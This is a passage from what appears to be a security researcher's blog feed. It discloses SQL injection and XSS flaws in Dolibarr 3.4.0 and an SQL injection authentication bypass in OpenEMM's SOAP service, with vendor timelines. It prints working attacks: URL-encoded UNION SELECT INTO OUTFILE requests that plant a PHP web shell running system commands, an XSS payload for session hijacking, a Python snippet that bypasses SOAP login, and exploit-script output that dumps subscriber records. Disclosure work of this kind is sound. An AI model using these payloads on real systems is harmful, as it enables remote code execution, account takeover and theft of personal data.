</pre></td><td class='code'><pre><code class=''><span class='line'>function analyse_sql_and_script(&$var, $type)
</span><span class='line'>{
</span><span class='line'>    if (is_array($var))
</span><span class='line'>    {
</span><span class='line'>        foreach ($var as $key =&gt; $value)
</span><span class='line'>        {
</span><span class='line'>            if (analyse_sql_and_script($value,$type))
</span><span class='line'>            {
</span><span class='line'>                $var[$key] = $value;
</span><span class='line'>            }
</span><span class='line'>            else
</span><span class='line'>            {
</span><span class='line'>                print 'Access refused by SQL/Script injection protection in main.inc.php';
</span><span class='line'>                exit;
</span><span class='line'>            }
</span><span class='line'>        }
</span><span class='line'>        return true;
</span><span class='line'>    }
</span><span class='line'>    else
</span><span class='line'>    {
</span><span class='line'>        return (test_sql_and_script_inject($var,$type) &lt;= 0);
</span><span class='line'>    }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Pretty typical recursive function for sanitizing input.  The following performs the actual sanity checking:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function test_sql_and_script_inject($val, $type)
</span><span class='line'>{
</span><span class='line'>    $sql_inj = 0;
</span><span class='line'>    // For SQL Injection (only GET and POST are used to be included into bad escaped SQL requests)
</span><span class='line'>    if ($type != 2)
</span><span class='line'>    {
</span><span class='line'>        $sql_inj += preg_match('/delete[\s]+from/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/create[\s]+table/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/update.+set.+=/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/insert[\s]+into/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/select.+from/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/union.+select/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/(\.\.%2f)+/i', $val);
</span><span class='line'>    }
</span><span class='line'>    // For XSS Injection done by adding javascript with script
</span><span class='line'>    // This is all cases a browser consider text is javascript:
</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
</span><span class='line'>    if ($type == 1)
</span><span class='line'>    {
</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
</span><span class='line'>    }
</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
</span><span class='line'>    return $sql_inj;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s quite clear that the blacklisting approach is inefficient; particularly the cross-site scripting protection.  The SQLi blacklisting doesn&rsquo;t restrict INTO OUTFILE/DUMPFILE, meaning with a well-tuned SQL injection we can throw a web shell onto the box.</p>

<p>Let&rsquo;s take a look at one such vulnerable query <code>contact/fiche.php</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if ($action == 'confirm_delete' && $confirm == 'yes' && $user-&gt;rights-&gt;societe-&gt;contact-&gt;supprimer)
</span><span class='line'>    {
</span><span class='line'>        $result=$object-&gt;fetch($_GET["id"]);</span></code></pre></td></tr></table></div></figure>


<p><code>contact/class/contact.class.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id, $user=0)
</span><span class='line'>    {
</span><span class='line'>        global $langs;
</span><span class='line'>
</span><span class='line'>        $langs-&gt;load("companies");
</span><span class='line'>
</span><span class='line'>        $sql = "SELECT c.rowid, c.fk_soc, c.civilite as civilite_id, c.lastname, c.firstname,";
</span><span class='line'>        $sql.= " c.address, c.zip, c.town,";
</span><span class='line'>        $sql.= " c.fk_pays as country_id,";
</span><span class='line'>        $sql.= " c.fk_departement,";
</span><span class='line'>        $sql.= " c.birthday,";
</span><span class='line'>        $sql.= " c.poste, c.phone, c.phone_perso, c.phone_mobile, c.fax, c.email, c.jabberid,";
</span><span class='line'>        $sql.= " c.priv, c.note_private, c.note_public, c.default_lang, c.no_email, c.canvas,";
</span><span class='line'>        $sql.= " c.import_key,";
</span><span class='line'>        $sql.= " p.libelle as country, p.code as country_code,";
</span><span class='line'>        $sql.= " d.nom as state, d.code_departement as state_code,";
</span><span class='line'>        $sql.= " u.rowid as user_id, u.login as user_login,";
</span><span class='line'>        $sql.= " s.nom as socname, s.address as socaddress, s.zip as soccp, s.town as soccity, s.default_lang as socdefault_lang";
</span><span class='line'>        $sql.= " FROM ".MAIN_DB_PREFIX."socpeople as c";
</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_pays as p ON c.fk_pays = p.rowid";
</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."c_departements as d ON c.fk_departement = d.rowid";
</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."user as u ON c.rowid = u.fk_socpeople";
</span><span class='line'>        $sql.= " LEFT JOIN ".MAIN_DB_PREFIX."societe as s ON c.fk_soc = s.rowid";
</span><span class='line'>        $sql.= " WHERE c.rowid = ". $id;
</span><span class='line'>
</span><span class='line'>        dol_syslog(get_class($this)."::fetch sql=".$sql);
</span><span class='line'>        $resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>


<p>Our vulnerable parameter <code>id</code> is sanitized only by the previously described functions.  There are now two main options; dump information from the database, or drop a web shell onto the host.  The latter is the best case and the former is, usually, a good consolatory prize.  However, in this case, the database is ripe with information, specifically:</p>

<p><img class="center" src="http://4.bp.blogspot.com/-2tO85Ih1O2s/UlEbzsgAAWI/AAAAAAAAAts/VlnnOIbHPQM/s1600/wow_db.JPG"></p>

<p>Yeah, that&rsquo;s your plaintext password stored right next to the hashed version.  Dumping the database just got a whole lot more interesting.</p>

<p>Our attention now turns to evading the filters listed above.  For obtaining a shell, the only evasion we need to consider is UNION SELECT, as INTO OUTFILE/DUMPFILE is not filtered.  After a bit of deliberation and source code analysis, it was determined that the filters were trivially bypassed by URL encoding SQL keywords.  The following query will drop a web shell at the given location:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://localhost/dolibarr-3.4.0/htdocs/contact/fiche.php?id=1%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php'&action=confirm_delete&confirm=yes HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>Which results in:</p>

<p><img class="center" src="http://1.bp.blogspot.com/-1fdpL601fvY/UlHJRh5Us-I/AAAAAAAAAt8/JKKRGytyNjQ/s640/web_shell.JPG" title="" ></p>

<p>The documents folder is a perfect candidate for our web shell as, during installation of the CMS, this folder must be user-created and writable by the install, giving us a guaranteed and predictable location for the web shell.</p>

<p>This vulnerability has been detected in <code>contact.class.php</code> in four different functions: fetch, update, delete, and create.</p>

<p>We now take another look at the XSS filtering function:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  // For XSS Injection done by adding javascript with script
</span><span class='line'>    // This is all cases a browser consider text is javascript:
</span><span class='line'>    // When it found '&lt;script', 'javascript:', '&lt;style', 'onload\s=' on body tag, '="&' on a tag size with old browsers
</span><span class='line'>    // All examples on page: http://ha.ckers.org/xss.html#XSScalc
</span><span class='line'>    $sql_inj += preg_match('/&lt;script/i', $val);
</span><span class='line'>    if (! defined('NOSTYLECHECK')) $sql_inj += preg_match('/&lt;style/i', $val);
</span><span class='line'>    $sql_inj += preg_match('/base[\s]+href/i', $val);
</span><span class='line'>    if ($type == 1)
</span><span class='line'>    {
</span><span class='line'>        $sql_inj += preg_match('/javascript:/i', $val);
</span><span class='line'>        $sql_inj += preg_match('/vbscript:/i', $val);
</span><span class='line'>    }
</span><span class='line'>    // For XSS Injection done by adding javascript closing html tags like with onmousemove, etc... (closing a src or href tag with not cleaned param)
</span><span class='line'>    if ($type == 1) $sql_inj += preg_match('/"/i', $val);          // We refused " in GET parameters value
</span><span class='line'>    if ($type == 2) $sql_inj += preg_match('/[\s;"]/', $val);     // PHP_SELF is an url and must match url syntax
</span><span class='line'>    return $sql_inj;</span></code></pre></td></tr></table></div></figure>


<p>As we can see, this is quite weak, and we can get by with a very simple injection, <code>&lt;body onload=alert(1)&gt;</code>.  Injecting this into the last name of a contact results in success:</p>

<p><img class="center" src="http://4.bp.blogspot.com/-FD3FnWu2bAg/UlHXEtGDaTI/AAAAAAAAAuM/RZ8Cr2wHiE4/s1600/xss2.JPG"></p>

<p>With this we can syphon off session IDs and completely hijack sessions.  Any field that&rsquo;s reflected back to the user is vulnerable, and considering this is a CMS, that&rsquo;s a lot.</p>

<p>All of the discussed vulnerabilities have, thus far, been post-auth.  One remotely exploitable pre-auth vulnerability was discovered in <code>public/members/public_list.php</code> (configured with <code>define("NOLOGIN",1)</code>), meaning it does not require auth):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$sortfield = GETPOST("sortfield",'alpha');
</span><span class='line'>$sortorder = GETPOST("sortorder",'alpha');
</span><span class='line'>$page = GETPOST("page",'int');
</span><span class='line'>if ($page == -1) { $page = 0; }
</span><span class='line'>$offset = $conf-&gt;liste_limit * $page;
</span><span class='line'>$pageprev = $page - 1;
</span><span class='line'>$pagenext = $page + 1;
</span><span class='line'>
</span><span class='line'>$filter=GETPOST('filter');
</span><span class='line'>$statut=GETPOST('statut');
</span><span class='line'>
</span><span class='line'>if (! $sortorder) {  $sortorder="ASC"; }
</span><span class='line'>if (! $sortfield) {  $sortfield="nom"; }
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>/*
</span><span class='line'> * View
</span><span class='line'> */
</span><span class='line'>
</span><span class='line'>llxHeaderVierge($langs-&gt;trans("ListOfValidatedPublicMembers"));
</span><span class='line'>
</span><span class='line'>$sql = "SELECT rowid, firstname, lastname, societe, zip, town, email, birth, photo";
</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."adherent";
</span><span class='line'>$sql.= " WHERE entity = ".$entity;
</span><span class='line'>$sql.= " AND statut = 1";
</span><span class='line'>$sql.= " AND public = 1";
</span><span class='line'>$sql.= $db-&gt;order($sortfield,$sortorder);
</span><span class='line'>$sql.= $db-&gt;plimit($conf-&gt;liste_limit+1, $offset);</span></code></pre></td></tr></table></div></figure>


<p>And <code>core/db/msqli.class.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> function order($sortfield=0,$sortorder=0)
</span><span class='line'>    {
</span><span class='line'>        if ($sortfield)
</span><span class='line'>        {
</span><span class='line'>            $return='';
</span><span class='line'>            $fields=explode(',',$sortfield);
</span><span class='line'>            foreach($fields as $val)
</span><span class='line'>            {
</span><span class='line'>                if (! $return) $return.=' ORDER BY ';
</span><span class='line'>                else $return.=',';
</span><span class='line'>
</span><span class='line'>                $return.=preg_replace('/[^0-9a-z_\.]/i','',$val);
</span><span class='line'>                if ($sortorder) $return.=' '.preg_replace('/[^0-9a-z]/i','',$sortorder);
</span><span class='line'>            }
</span><span class='line'>            return $return;
</span><span class='line'>        }
</span><span class='line'>        else
</span><span class='line'>        {
</span><span class='line'>            return '';
</span><span class='line'>        }
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p>And navigation to the page results in:</p>

<p><img class="center" src="http://3.bp.blogspot.com/-jr_PuLchQdA/UlHbsoCHgpI/AAAAAAAAAuY/a-EKEX_ZqKU/s640/preauth_injection.JPG"></p>

<p>As shown, the <code>sortfield</code> and <code>sortorder</code> parameters are inadequately sanitized, but exploitation may be a bit tricky.  The order function strips everything that isn&rsquo;t a number, lowercase alphanumeric letter, or one of three symbols.  Instead, why don&rsquo;t we exploit yet <em>another</em> preauth vulnerability in <code>opensurvey/public/exportcsv.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$action=GETPOST('action');
</span><span class='line'>$numsondage = $numsondageadmin = '';
</span><span class='line'>
</span><span class='line'>if (GETPOST('sondage'))
</span><span class='line'>{
</span><span class='line'>    if (strlen(GETPOST('sondage')) == 24)    // recuperation du numero de sondage admin (24 car.) dans l'URL
</span><span class='line'>    {
</span><span class='line'>        $numsondageadmin=GETPOST("sondage",'alpha');
</span><span class='line'>        $numsondage=substr($numsondageadmin, 0, 16);
</span><span class='line'>    }
</span><span class='line'>    else
</span><span class='line'>    {
</span><span class='line'>        $numsondageadmin='';
</span><span class='line'>        $numsondage=GETPOST("sondage",'alpha');
</span><span class='line'>    }
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>$object=new Opensurveysondage($db);
</span><span class='line'>$result=$object-&gt;fetch(0,$numsondage);
</span><span class='line'>if ($result &lt;= 0) dol_print_error('','Failed to get survey id '.$numsondage);</span></code></pre></td></tr></table></div></figure>


<p>And <code>opensurvey/class/opensurveysondage.class.php</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>function fetch($id,$numsurvey='')
</span><span class='line'>{
</span><span class='line'>global $langs;
</span><span class='line'>
</span><span class='line'>$sql = "SELECT";
</span><span class='line'>//$sql.= " t.rowid,";
</span><span class='line'>$sql.= " t.id_sondage,";
</span><span class='line'>$sql.= " t.commentaires,";
</span><span class='line'>$sql.= " t.mail_admin,";
</span><span class='line'>$sql.= " t.nom_admin,";
</span><span class='line'>$sql.= " t.titre,";
</span><span class='line'>$sql.= " t.id_sondage_admin,";
</span><span class='line'>$sql.= " t.date_fin,";
</span><span class='line'>$sql.= " t.format,";
</span><span class='line'>$sql.= " t.mailsonde,";
</span><span class='line'>$sql.= " t.survey_link_visible,";
</span><span class='line'>$sql.= " t.canedit,";
</span><span class='line'>$sql.= " t.sujet,";
</span><span class='line'>$sql.= " t.tms";
</span><span class='line'>$sql.= " FROM ".MAIN_DB_PREFIX."opensurvey_sondage as t";
</span><span class='line'>if ($id &gt; 0) $sql.= " WHERE t.rowid = ".$id;
</span><span class='line'>else if (strlen($numsurvey) == 16) $sql.= " WHERE t.id_sondage = '".$numsurvey."'";
</span><span class='line'>else $sql.= " WHERE t.id_sondage_admin = '".$numsurvey."'";
</span><span class='line'>
</span><span class='line'>dol_syslog(get_class($this)."::fetch sql=".$sql, LOG_DEBUG);
</span><span class='line'>$resql=$this-&gt;db-&gt;query($sql);</span></code></pre></td></tr></table></div></figure>


<p>As the bolded path shows, the query argument <code>numsurvey</code> is directly controllable by an unauthenticated user, leading to the same type of SQL vulnerability shown earlier.  This can be exploited with the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET /dolibarr/htdocs/opensurvey/public/exportcsv.php?sondage='%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20'&lt;?php%20system($_GET[\'cmd\'])?&gt;',2,3,4,5,6,7,8,9,10,11,12,13%20INTO%20OUTFILE%20'/var/www/dolibarr-3.4.0/documents/shell.php';%20--%20-%20 HTTP/1.1</span></code></pre></td></tr></table></div></figure>


<p>Using the same URL encoding trick from before, we can bypass the blacklisting and inject directly into the vulnerable query.  Exploit code for this is included at the bottom of the post:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python dolibarr_34_sploit.py -i 192.168.1.100 -p /dolibarr-3.4.0 -w /var/www/dolibarr-3.4.0/documents
</span><span class='line'>[!] Dropping web shell on 192.168.1.100...
</span><span class='line'>[!] Shell dropped.  http://192.168.1.100/documents/o4oct.php?cmd=ls
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://4.bp.blogspot.com/-zzy2s3woupU/UlICbKycNVI/AAAAAAAAAuo/Qauz6R-GQjo/s640/shell_thing.JPG"></p>

<p>Fortunately, for users running DoliWamp,  Dolibarr + WAMP package on Windows, the default user that the database runs with is not allowed to write files.  They are still vulnerable, however, to database corruption and traversal (i.e. drop table subqueries, etc.).</p>

<h3>Timeline</h3>


<ul>
<li>10/06/2013 &ndash; Vendor notified of remotely exploitable vulnerabilities</li>
<li>10/07/2013 &ndash; Vendor acknowledges vulnerability, no timeline provided</li>
<li>10/11/2013 &ndash; Vendor states fix will be in the 3.4.1 release within the month</li>
<li>10/14/2013 &ndash; 3.4.1 released with patch.  This advisory released</li>
</ul>


<p><a href="http://www.exploit-db.com/exploits/28971/">Exploit</a></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OpenEMM-2013 SOAP SQLi/Stored XSS]]></title>
    <link href="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/"/>
    <updated>2013-07-28T22:24:15-07:00</updated>
    <id>http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss</id>
    <content type="html"><![CDATA[<p><a href="http://www.openemm.org/">OpenEMM</a> is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.</p>

<p>Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  /**
</span><span class='line'>     * Gets the SQL string.
</span><span class='line'>     */
</span><span class='line'>    public static String getSQLSafeString(String input) {
</span><span class='line'>        if (input == null) {
</span><span class='line'>            return " ";
</span><span class='line'>        } else {
</span><span class='line'>            return input.replace("'", "''");
</span><span class='line'>        }
</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>This function inadequately sanitizes input.  The following malicious input would successfully slip through:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>\' AND UNION SELECT 1,2,3;-- </span></code></pre></td></tr></table></div></figure>


<p>Which, when inserted into an example query <code>SELECT * FROM admin WHERE username = '$user';</code> becomes
<code>SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';</code></p>

<p>This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {
</span><span class='line'>        boolean result=false;
</span><span class='line'>        Connection dbConn=this.getConnection(msct);
</span><span class='line'>        Statement agnStatement=null;
</span><span class='line'>        ResultSet rset=null;
</span><span class='line'>        
</span><span class='line'>        try {
</span><span class='line'>            agnStatement=dbConn.createStatement();
</span><span class='line'>            rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
</span><span class='line'>            if(rset!=null && rset.next()) {
</span><span class='line'>                result=true;
</span><span class='line'>            } else {
</span><span class='line'>                result=false;
</span><span class='line'>                HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
</span><span class='line'>                log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>


<p>As shown, the vulnerable <code>getSQLSafeString</code> method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at <code>http://yourhost.com/emm_webservices</code>).</p>

<p>The following code will bypass SOAP authentication and add a new mailing list:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from SOAPpy import WSDL
</span><span class='line'>
</span><span class='line'>wsdl_file = "./ws.wsdl"
</span><span class='line'>sploit = "\\' OR 1=1;-- "
</span><span class='line'>
</span><span class='line'>_server = WSDL.Proxy(wsdl_file)
</span><span class='line'>ret = _server.addMailinglist("wsadmin", sploit, "w00t", "w00t")
</span><span class='line'>if ret &gt; 0:
</span><span class='line'>    print 'success (%d)'%ret</span></code></pre></td></tr></table></div></figure>


<p>This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I&rsquo;ve included exploit code that exploits several of these functions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -h
</span><span class='line'>usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [--dm] [--ds]
</span><span class='line'>
</span><span class='line'>optional arguments:
</span><span class='line'>  -h, --help  show this help message and exit
</span><span class='line'>  -i HOST     server address
</span><span class='line'>  -s          fetch all subscribers
</span><span class='line'>  -m MLIST    create new mailing list (XSS)
</span><span class='line'>  --dm        delete all mailing lists
</span><span class='line'>  --ds        delete all subscribers
</span><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30449464&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Last', 'First', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'first.last@domain.org', '2', '6', '29', '54', '0', '17', '1']}
</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30446728&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Name', 'No', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'no.name@yourdomain.com', '2', '6', '29', '54', '0', '17', '2']}
</span><span class='line'>[!] Discovered 2 subscribers
</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>


